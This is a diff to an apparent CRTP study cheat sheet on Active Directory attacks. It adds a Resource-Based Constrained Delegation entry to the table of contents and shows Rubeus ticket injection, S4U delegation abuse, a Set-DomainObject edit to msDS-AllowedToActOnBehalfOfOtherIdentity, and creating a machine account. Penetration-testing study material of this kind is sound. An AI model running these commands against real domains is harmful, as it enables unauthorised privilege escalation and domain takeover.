@@ -35,6 +35,7 @@
   - [Constrained delegation](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#constrained-delegation)
     - [Rubeus S4U - Constrained Delegation User](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-s4u---constrained-delegation-user)
     - [Rubeus S4U - Constrained Delegation Machine](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-s4u---constrained-delegation-machine)
+ - [Resource-Based Constrained Delegation]
 - [DNS Admins](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#dns-admins)
 - [Forest Trusts](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#forests-and-trusts)
   - [Within Forest - Child to Parent Domain/ForestRoot](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#child-to-parent---intra-forest-trust)
@@ -900,16 +901,11 @@ OR
 ``` Rubeus.exe ptt /ticket:C:\Windows\System32\TGS_LDAP_adminsrv$<snip>_.kirbi ```
 * * *
 
-# Resouce-Based Constrained Delegation
+# Resource-Based Constrained Delegation
 in RBCD its the backend service which sets the delegation parameters
 for this we need GenericWrite privileges on an RBCD server so, we can update the msDS-AllowedToActOnBehalfOfOtherIdentity and add the SID of a different computer.
 
-we can create a new machine account, create a sid then set it
-
-```
-Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds- allowedtoactonbehalfofotheridentity'=$SDBytes}
-```
-the n run s4u as before - 
+we can create a new machine account, create a sid and set it, then run s4u as before - 
 
 ```
 New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
